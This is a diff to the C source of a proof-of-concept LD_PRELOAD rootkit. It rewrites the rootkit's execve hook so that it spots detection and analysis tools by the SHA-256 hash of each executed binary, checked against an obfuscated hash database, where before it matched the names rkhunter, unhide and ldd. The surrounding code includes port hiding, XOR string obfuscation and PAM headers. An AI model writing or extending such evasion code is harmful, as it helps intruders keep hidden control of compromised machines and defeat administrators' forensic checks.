@@ -23,6 +23,7 @@
 #include <security/pam_appl.h>
 #include <security/pam_modules.h>
 #include <pwd.h>
+#include <openssl/evp.h>
 
 #include "etc.h"
 #include "libshserver.h"
@@ -265,13 +266,17 @@ FILE *hide_ports(const char *filename) {
 int execve(const char *path, char *const argv[], char *const envp[]) {
     DEBUG("[rootkit-poc]: execve hooked %s\n", path);
 
-    char *rkhunter = strdup(C_RKHUNTER);
-    char *unhide = strdup(C_UNHIDE);
-    char *ldd = strdup(C_LDD);
-    char *ld_linux = strdup(LD_LINUX);
+    unsigned char hash[EVP_MAX_MD_SIZE];
+    unsigned int hash_length;
+    calculate_sha256(path, hash, &hash_length);
+    char hash_string[65];
+    hash_to_string(hash, hash_length, hash_string);
+
+    char *hash_db_path = strdup(HASH_DB_PATH);
     char *ld_trace = strdup(LD_TRACE);
 
     xor(ld_trace);
+    xor(hash_db_path);
 
     char *trace_var = getenv(ld_trace);
 
@@ -281,13 +286,20 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
 
     init(); // hook configurations
 
-    xor(rkhunter);
-    xor(unhide);
-    xor(ldd);
-    xor(ld_linux);
+    FILE *hash_db_file = syscall_list[SYS_FOPEN].syscall_func(hash_db_path, "r");
+    if (!hash_db_file) {
+        DEBUG("[rootkit-poc]: Error opening hash database %s\n", hash_db_path);
+        cleanup(hash_db_path, strlen(hash_db_path));
+        return (long) syscall_list[SYS_EXECVE].syscall_func(path, argv, envp);
+    }
+
+    cleanup(hash_db_path, strlen(hash_db_path));
+
+    int is_hide = is_hash_in_db(hash_string, hash_db_file);
+    fclose(hash_db_file);
 
     // If the path corresponds to certain debugging or analysis tools
-    if (strstr(path, rkhunter) || strstr(path, unhide) || strstr(path, ldd) || strstr(path, ld_linux) || trace_var != NULL) {
+    if (is_hide || trace_var != NULL) {
         char *ld_normal = strdup(LD_NORMAL);
         char *ld_hide = strdup(LD_HIDE);
 
@@ -320,11 +332,6 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
         // Calls the original execve function if it's not debugging
         ret = (long) syscall_list[SYS_EXECVE].syscall_func(path, argv, envp);
     }
-
-    cleanup(rkhunter, strlen(rkhunter));
-    cleanup(unhide, strlen(unhide));
-    cleanup(ldd, strlen(ldd));
-    cleanup(ld_linux, strlen(ld_linux));
 
     exit(ret); // exit with the return value of the original execve function
 }
